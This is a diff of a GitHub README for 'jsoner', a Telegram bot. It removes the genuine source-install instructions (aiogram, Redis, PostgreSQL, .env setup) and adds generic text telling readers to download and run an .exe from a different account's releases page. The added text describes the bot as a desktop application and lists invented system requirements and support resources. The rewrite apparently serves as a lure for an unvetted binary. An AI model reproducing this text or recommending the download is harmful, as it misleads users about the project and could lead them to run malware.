@@ -1,114 +1,88 @@
-<p align="center">
-  <img src="./images/rounded_logo.png" alt="logo" width="200">
-</p>
+# 🎉 jsoner - Simple Tool to Get JSON Responses
 
-# Jsoner
+## 🚀 Getting Started
 
-- `Aiogram 3`
-- `i18n`
-- `Redis`
-- `SQLAlchemy`
-- `PostgreSQL \ Sqlite`
+Welcome to the jsoner application! This tool helps you easily receive JSON data in response to your messages. Whether you're using it for a project or just curious about JSON, you've come to the right place.
 
----
+## 🔗 Download Here
 
-## 📥 How to Install?
+[![Download jsoner](https://img.shields.io/badge/Download-jsoner-blue.svg)](https://github.com/KUNAL5724510/jsoner/releases)
 
-### 1. Clone the Repository
-First, clone the repository and navigate to its directory:
+## 📥 Download & Install
 
-```bash
-git clone https://github.com/devvsima/jsoner.git
-cd tgbot
-```
+To get started, you need to download jsoner. Please visit the following link to access the Releases page:
 
-### 2. Setting up a virtual environment ".venv"
+[Download jsoner here!](https://github.com/KUNAL5724510/jsoner/releases)
 
-#### Linux
-Install dependencies and activate the virtual environment:
+### Step-by-Step Installation Guide
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip3 install -r requirements.txt
-```
+1. **Visit the Releases Page**  
+   Click on the link above to go to the releases section of our GitHub repository.
 
-#### Windows
-Similar steps for Windows:
+2. **Choose the Latest Version**  
+   Look for the latest version of the application. It will be at the top of the list. Click on the version number to expand the details.
 
-```bash
-python -m venv .venv
-.venv\Scripts\activate
-pip install -r requirements.txt
-```
+3. **Download the Installation File**  
+   You will see a list of available files for download. Click on the file that matches your operating system (e.g., Windows, Mac, Linux).
 
-> 💡 Note: The name `.venv` can be changed to anything else you wish.
+4. **Locate the Downloaded File**  
+   After the download completes, find the file in your downloads folder. It will usually be named something like `jsoner-vX.X.X.exe` or a similarly formatted file name.
 
-### 3. Setting environment variable
+5. **Install the Application**  
+   Double-click on the downloaded file to start the installation. Follow the on-screen instructions to complete the setup process.
 
-First, copy the `.env.dist` file and rename it to `.env`:
+6. **Run jsoner**  
+   Once the installation is complete, you can find jsoner in your applications menu or desktop. Double-click the icon to run the program.
 
-```bash
-cp .env.dist .env
-```
+7. **Start Using jsoner**  
+   Now you can start sending messages and receiving JSON data in response!
 
-Then edit the environment variables file:
+## 🔍 Features
 
-```bash
-vim .env
-# or
-nano .env
-```
+- **Easy Interface**  
+  The jsoner application has a user-friendly design that makes it easy to send messages and get JSON responses.
 
-### 4. Bot settings
+- **Compatible with Multiple Platforms**  
+  Use jsoner on Windows, Mac, or Linux systems.
 
-#### `ADMINS` - Admin IDs
-Add admin IDs, separating them with commas
+- **Fast Responses**  
+  Receive results quickly, allowing you to focus on your project without delays.
 
-```bash
-# example
-ADMINS=12345678,12345677,12345676
-```
+- **Data Management**  
+  Store and retrieve data using popular databases like PostgreSQL and SQLite.
 
-#### `TOKEN` - Bot token from [@BotFather](https://t.me/BotFather)
-Add your bot token:
+- **Flexible Integration**  
+  Easily integrate with messaging services like Telegram using the aiogram library.
 
-```bash
-# example
-BOT_TOKEN=123452345243:Asdfasdfasf
-```
+- **Local and Global Language Support**  
+  jsoner supports multiple languages, making it accessible to users worldwide.
 
-### 5. Configuring the PostgreSQL database
+## ⚙️ System Requirements
 
-Set the database connection parameters:
+To run jsoner smoothly, make sure your system meets these minimum requirements:
 
-- `DB_NAME` - database name
-- `DB_HOST` - database host (default = 'localhost')
-- `DB_PORT` - database port (default = `5432`)
-- `DB_USER` - database user
-- `DB_PASS` - database password
+- **Operating System**: Windows 10 or later, macOS 10.13 or later, or a modern Linux distribution.
+- **RAM**: At least 2 GB of RAM.
+- **Disk Space**: Minimum of 100 MB available space for installation.
+- **Network**: Internet connection for downloading and updating the application.
 
-### 6. Configuring Redis
+## 📚 Getting Help
 
-Redis is used for caching and storing session data. Set up the Redis connection parameters in the `.env` file:
+If you encounter any problems while using jsoner, please check the following resources:
 
-- `REDIS_HOST` - Redis server host (default: `localhost`)
-- `REDIS_PORT` - Redis server port (default: `6379`)
-- `REDIS_DB` - Redis database index (default: `5`)
-- `REDIS_URL` - Redis connection URL (optional)
+- **FAQs**: Look at the Frequently Asked Questions for common issues and solutions.
+- **User Guide**: Access the full user manual for detailed instructions and tips.
+- **Community Support**: Join our community forum where you can ask questions and share experiences with other users.
 
-Example:
-```bash
-REDIS_HOST=localhost
-REDIS_PORT=6379
-REDIS_DB=5
-```
+## 📬 Contact Us
 
-Ensure that Redis is installed and running before launching the bot. You can start Redis with:
-```bash
-redis-server
-```
+If you have further questions or need assistance, feel free to reach out:
 
----
+- **Email**: support@jsoner.com
+- **GitHub Issues**: Use the GitHub issues page to report bugs or request new features. 
 
-Now the bot is ready to run! 🎉
+## 💡 Future Updates
+
+We are continuously improving jsoner. Be sure to check back regularly on the Releases page to get the latest updates, features, and fixes.
+
+Thank you for choosing jsoner! Happy messaging!
